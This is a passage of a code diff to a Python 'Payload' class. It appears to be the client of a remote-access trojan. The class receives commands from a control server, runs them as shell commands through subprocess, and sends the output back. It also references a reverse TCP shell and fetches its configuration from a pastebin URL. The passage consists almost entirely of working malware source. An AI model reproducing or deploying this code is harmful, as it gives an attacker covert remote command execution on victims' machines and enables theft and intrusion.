-                                cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
-                                try:
-                                    result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(Payload) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                                except Exception as e1:
-                                    result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
-                                task.update({'result': result})
-                                self._server_send(**task)
-                                if cmd and cmd in self._flags['tasks'] and 'PRIVATE KEY' not in task['command']:
-                                    self._results[task['task']] = task
-                                self._flags['prompt'].set()
+                    if not self._flags['prompt'].is_set():
+                        task = self._server_recv()
+                        if isinstance(task, dict):
+                            cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
+                            try:
+                                result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(Payload) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                            except Exception as e1:
+                                result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
+                            task.update({'result': result})
+                            self._server_send(**task)
+                            if cmd and cmd in self._flags['tasks'] and 'PRIVATE KEY' not in task['command']:
+                                self._task_save(task, result)
+                        self._flags['prompt'].set()
                 else:
                     self.debug("Connection timed out")
                     break
@@ -2463,7 +2349,7 @@ class Payload():
             with Payload._lock:
                 print(bytes(data))
 
-                
+
     def connect(self, **kwargs):
         """
         connect to server and start new session
@@ -2472,16 +2358,15 @@ class Payload():
             self._session['socket']     = self._server_connect(**kwargs)
             self._session['key']        = self._session_key()
             self._session['id']         = self._session_id()
-            self._session['public_key'] = self._get_public_key()
             return True
         except Exception as e:
             self.debug("{} error: {}".format(self.connect.func_name, str(e)))
-        return self._get_restart(self.connect.func_name)
+        return False
 
 
     def run(self, **kwargs):
         """
-        run Payload startup routine
+        run client startup routine
         """
         try:
             if self.connect(**kwargs):
@@ -2498,5 +2383,5 @@ class Payload():
 
 if __name__ == "__main__":
     payload = Payload()
-    payload.run(config='https://pastebin.com/raw/uYGhnVqp')
+    payload.run(config='https://pastebin.com/raw/uYGhnVqp', debug=True)
 
